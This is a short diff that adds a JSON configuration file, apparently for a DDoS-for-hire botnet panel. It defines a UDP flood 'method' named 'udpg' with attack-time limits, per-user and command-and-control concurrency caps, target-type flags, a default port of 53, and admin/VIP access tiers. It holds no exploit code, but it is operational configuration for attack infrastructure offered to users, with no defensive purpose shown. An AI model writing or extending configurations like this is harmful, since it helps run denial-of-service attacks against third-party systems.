@@ -1,0 +1,19 @@
+{
+	"methods":[
+		{
+			"name": "udpg",
+			"api": [""],
+			"moderation": {
+				"limitattacktime": false,
+				"maxtime":0,
+				"limit_concs_per_user": 1,
+				"limit_concs_on_cnc": 1,
+				"just_domains": false,
+				"just_ips": false,
+				"defaultport": 53,
+				"adminmethod": false,
+				"vipmethod": false
+			}
+		}
+	]
+}
